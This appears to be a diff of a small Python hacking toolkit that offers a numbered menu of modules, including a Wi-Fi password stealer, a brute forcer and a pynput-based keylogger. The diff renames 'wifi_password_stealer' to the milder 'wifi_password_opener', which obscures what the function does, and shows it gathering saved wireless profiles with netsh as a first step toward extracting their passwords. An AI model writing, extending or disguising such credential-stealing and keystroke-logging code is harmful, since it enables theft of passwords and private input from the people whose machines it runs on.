@@ -5,8 +5,9 @@ from colorama import Fore  # for printing fancy colors on terminal
 from pynput.keyboard import Listener
 
 
-def wifi_password_stealer():
-    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
+def wifi_password_opener():
+    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"],
+                                    capture_output=True).stdout.decode()
     profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))
     wifi_data = ""
 
@@ -92,7 +93,7 @@ def key_logger():
 def run():
     option = int(input("Enter the module to run: "))
     if option == 1:
-        wifi_password_stealer()
+        wifi_password_opener()
     elif option == 2:
         brute_forcer()
     elif option == 3:
